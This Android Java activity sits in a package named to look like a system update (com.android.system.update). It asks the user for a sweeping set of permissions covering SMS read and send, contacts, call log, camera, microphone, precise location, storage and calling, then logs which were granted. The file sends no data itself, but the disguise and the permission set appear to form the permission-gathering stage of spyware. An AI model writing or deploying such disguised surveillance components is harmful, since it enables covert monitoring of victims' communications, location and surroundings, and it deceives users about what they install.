package com.android.system.update;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class PermissionRequestActivity extends Activity {
    private static final String TAG = "PermissionRequestActivity";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    private static final String[] REQUIRED_PERMISSIONS = new String[] {
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "PermissionRequestActivity created");

        // Check if all permissions are already granted
        boolean allGranted = true;
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            Log.d(TAG, "All permissions already granted");
            finish();
            return;
        }

        // Request permissions
        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < permissions.length; i++) {
                result.append(permissions[i])
                      .append(": ")
                      .append(grantResults[i] == PackageManager.PERMISSION_GRANTED ? "GRANTED" : "DENIED")
                      .append("\n");
            }
            Log.d(TAG, "Permission results:\n" + result.toString());
        }
        
        finish();
    }
}
